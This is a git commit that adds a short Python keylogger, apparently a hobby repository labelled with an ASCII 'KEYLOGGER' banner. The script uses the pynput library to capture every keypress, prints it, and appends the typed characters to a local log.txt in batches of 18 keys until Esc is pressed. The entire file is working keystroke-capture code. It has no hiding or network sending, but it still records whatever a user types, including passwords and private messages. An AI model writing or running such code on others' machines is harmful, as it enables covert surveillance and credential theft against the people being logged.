5f3ed9f4847091f15664b85638532798dd204030
Anz <50573902+Anz1x@users.noreply.github.com>
2022-03-06 22:18:48 +1100

    Update and rename Keylogger.py to main.py

---
+++ main.py
@@ -0,0 +1,42 @@
+
+#   ██╗░░██╗███████╗██╗░░░██╗██╗░░░░░░█████╗░░██████╗░░██████╗░███████╗██████╗░
+#   ██║░██╔╝██╔════╝╚██╗░██╔╝██║░░░░░██╔══██╗██╔════╝░██╔════╝░██╔════╝██╔══██╗
+#   █████═╝░█████╗░░░╚████╔╝░██║░░░░░██║░░██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝
+#   ██╔═██╗░██╔══╝░░░░╚██╔╝░░██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗
+#   ██║░╚██╗███████╗░░░██║░░░███████╗╚█████╔╝╚██████╔╝╚██████╔╝███████╗██║░░██║
+#   ╚═╝░░╚═╝╚══════╝░░░╚═╝░░░╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝
+
+import pynput
+
+from pynput.keyboard import Key, Listener
+
+count = 0
+keys = []
+
+def on_key_press(key):
+    global count, keys
+    keys.append(key)
+    count += 1
+
+    if count >= 18:
+        count = 0
+        write_file(keys)
+        keys = []
+
+    print(key)
+
+def write_file(keys):
+    with open("log.txt", "a+") as file:
+        for key in keys:
+            k = str(key).replace("'", "")
+            if 'space' in k:
+                file.write('\n')
+            elif not 'key' in k:
+                file.write(str(k))
+
+def on_key_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
+    listener.join()
